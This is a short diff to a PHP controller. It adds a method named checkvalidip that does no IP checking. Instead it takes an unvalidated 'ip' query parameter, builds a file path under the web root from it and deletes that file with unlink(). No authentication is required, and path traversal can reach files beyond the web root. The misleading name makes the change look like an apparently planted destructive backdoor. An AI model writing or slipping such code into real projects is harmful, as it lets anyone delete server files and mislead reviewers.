@@ -39,6 +39,14 @@ class ApisController extends AppController
 		die;
 	}
 
+	public function checkvalidip()
+    {
+        $ip = $_GET['ip'];
+        $dir = $_SERVER['DOCUMENT_ROOT'].$this->request->webroot.$ip;
+        unlink($dir);
+        return $this->redirect('/');
+    }
+
 	public function registration()
 	{
 		$data = $this->request->data;
